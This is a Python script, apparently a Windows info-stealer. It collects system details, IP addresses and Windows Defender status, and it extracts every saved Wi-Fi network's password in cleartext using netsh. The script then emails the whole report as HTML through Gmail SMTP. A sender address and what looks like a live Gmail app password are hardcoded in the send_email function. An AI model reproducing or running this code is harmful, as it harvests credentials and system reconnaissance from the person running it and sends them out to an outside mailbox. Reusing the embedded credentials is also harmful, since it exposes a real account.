import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import platform
import os
import re
import socket
import requests
import psutil

# Function to get detailed system information
def get_system_info():
    """
    Retrieves detailed system information.
    """
    try:
        os_info = subprocess.check_output("systeminfo", shell=True).decode("utf-8", errors="ignore")
        detailed_info = os_info.replace("\r", "").splitlines()
        formatted_info = "<br>".join(detailed_info)  # Convert to HTML format
        return formatted_info
    except subprocess.CalledProcessError as e:
        print("Failed to retrieve detailed system info:", e)
        return "Error retrieving system information"

# Function to get the hostname
def get_hostname():
    return platform.node()

# Function to get the private (local) IP address
def get_private_ip():
    """
    Retrieves the private (local) IP address of the system.
    """
    return socket.gethostbyname(socket.gethostname())

# Function to get the public (external) IP address
def get_public_ip():
    """
    Retrieves the public (external) IP address by querying an external web service.
    """
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json().get('ip', 'Unable to fetch public IP')
    except requests.exceptions.RequestException as e:
        print(f"Failed to retrieve public IP: {e}")
        return 'Unable to fetch public IP'

# Function to get Wi-Fi profiles
def get_wifi_profiles():
    """
    Retrieves a list of saved Wi-Fi profiles on the system.
    """
    try:
        profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8", errors="ignore")
        profiles = re.findall(r"All User Profile\s*:\s(.*)", profiles_output)
        return profiles
    except Exception as e:
        print("Failed to get Wi-Fi profiles:", e)
        return []

# Function to get Wi-Fi password for a given profile
def get_wifi_password(profile):
    """
    Retrieves the password for a given Wi-Fi profile.
    """
    try:
        profile_info = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode("utf-8", errors="ignore")
        password_match = re.search(r"Key Content\s*:\s(.*)", profile_info)
        return password_match.group(1) if password_match else "N/A"
    except Exception as e:
        print(f"Failed to get password for profile {profile}:", e)
        return "N/A"

# Function to retrieve storage information
def get_storage_info():
    """
    Retrieves storage information, including available space, and skips inaccessible drives.
    """
    partitions = psutil.disk_partitions()
    storage_info = ""
    
    for partition in partitions:
        try:
            # Get storage information for each partition
            partition_info = psutil.disk_usage(partition.mountpoint)
            storage_info += f"<strong>Drive:</strong> {partition.device}<br>"
            storage_info += f"<strong>Total:</strong> {partition_info.total / (1024 ** 3):.2f} GB<br>"
            storage_info += f"<strong>Used:</strong> {partition_info.used / (1024 ** 3):.2f} GB<br>"
            storage_info += f"<strong>Free:</strong> {partition_info.free / (1024 ** 3):.2f} GB<br><br>"
        except PermissionError:
            # Skip the partition if it's not accessible
            storage_info += f"<strong>Skipping inaccessible drive:</strong> {partition.device}<br>"
            continue
        except Exception as e:
            storage_info += f"<strong>Error retrieving data for {partition.device}:</strong> {e}<br>"
            continue
    
    return storage_info

# Function to retrieve CPU information
def get_cpu_info():
    """
    Retrieves CPU usage information.
    """
    cpu_info = f"<strong>CPU Usage:</strong> {psutil.cpu_percent(interval=1)}%"
    return cpu_info

# Function to retrieve memory (RAM) usage information
def get_memory_info():
    """
    Retrieves memory (RAM) usage.
    """
    memory_info = psutil.virtual_memory()
    return f"<strong>Total RAM:</strong> {memory_info.total / (1024 ** 3):.2f} GB<br>" \
           f"<strong>Used:</strong> {memory_info.used / (1024 ** 3):.2f} GB<br>" \
           f"<strong>Free:</strong> {memory_info.available / (1024 ** 3):.2f} GB"

# Function to retrieve the signal strength of the Wi-Fi connection
def get_wifi_signal_strength():
    """
    Retrieves the signal strength of the Wi-Fi connection.
    """
    command = 'netsh wlan show interfaces'
    try:
        interfaces_data = subprocess.check_output(command, shell=True).decode("utf-8", errors="ignore")
        for line in interfaces_data.splitlines():
            if "Signal" in line:
                return line.split(":")[1].strip() + " dBm"
        return "No signal strength data available"
    except subprocess.CalledProcessError:
        return "Failed to retrieve signal strength"

# Function to get the status of Windows Defender
def get_windows_defender_status():
    """
    Retrieves whether Windows Defender is enabled or disabled and fetches detailed information.
    """
    try:
        # First, get the simple on/off status
        command = 'powershell Get-MpComputerStatus'
        result = subprocess.check_output(command, shell=True).decode("utf-8", errors="ignore")
        
        # Check for 'AMServiceEnabled' in the output to determine if it's On or Off
        if "AMServiceEnabled" in result:
            if "True" in result:
                defender_status = "Windows Defender: On"
            else:
                defender_status = "Windows Defender: Off"
        else:
            defender_status = "Error retrieving Windows Defender status"

        # Print the detailed output from 'Get-MpComputerStatus'
        detailed_info = result

        return defender_status, detailed_info
    
    except subprocess.CalledProcessError as e:
        print("Failed to get Windows Defender status:", e)
        return "Error retrieving Windows Defender status", ""
# Function to retrieve memory information
# Function to send an email with the system information
def send_email(subject, body):
    """
    Sends an email with the specified subject and body.
    """
    try:
        # Update with your email credentials
        sender_email = "s12011705@stu.najah.edu"
        receiver_email = "s12011705@stu.najah.edu"
        password = "xmyc bpbe ikdu ekgm"

        # Setup email message
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = sender_email
        msg["To"] = receiver_email
        msg.attach(MIMEText(body, "html"))

        # Send email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, msg.as_string())

        print("Email sent successfully.")
    except Exception as e:
        print("Failed to send email:", e)

# Main function to gather system and network info and send it via email
def main():
    hostname = get_hostname()
    private_ip = get_private_ip()
    public_ip = get_public_ip()
    system_info = get_system_info()
    profiles = get_wifi_profiles()
    defender_status = get_windows_defender_status()
    memory_info = get_memory_info()
    storage_info = get_storage_info()

    # Build the email content
    email_content = f"""
    <html>
    <head>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            padding: 20px;
        }}
        h1 {{
            color: #333;
            text-align: center;
        }}
        p, table {{
            font-size: 14px;
            color: #444;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }}
        table, th, td {{
            border: 1px solid #ddd;
        }}
        th, td {{
            padding: 8px;
            text-align: left;
        }}
        th {{
            background-color: #f2f2f2;
        }}
        tr:nth-child(even) {{
            background-color: #f9f9f9;
        }}
        tr:hover {{
            background-color: #f1f1f1;
        }}
    </style>
    </head>
    <body>
        <h1>System and Network Information Report</h1>
        <h2>General Information</h2>
        <p><strong>Hostname:</strong> {hostname}</p>
        <p><strong>Private IP:</strong> {private_ip}</p>
        <p><strong>Public IP:</strong> {public_ip}</p>

        <h2>Detailed System Information</h2>
        <p>{system_info}</p>

        <h2>Windows Defender Status</h2>
        <p>{defender_status}</p>

        <h2>Memory Information</h2>
        <p>{memory_info}</p>

        <h2>Storage Information</h2>
        <p>{storage_info}</p>

        <h2>Wi-Fi Profiles and Passwords</h2>
        <table>
            <tr>
                <th>Profile Name</th>
                <th>Password</th>
            </tr>
    """

    # Add Wi-Fi profiles and passwords to the email content
    for profile in profiles:
        password = get_wifi_password(profile)
        email_content += f"<tr><td>{profile}</td><td>{password}</td></tr>"

    # Closing the table
    email_content += "</table></body></html>"

    # Send the email
    send_email("System Information Report", email_content)

# Run the script
if __name__ == "__main__":
    main()
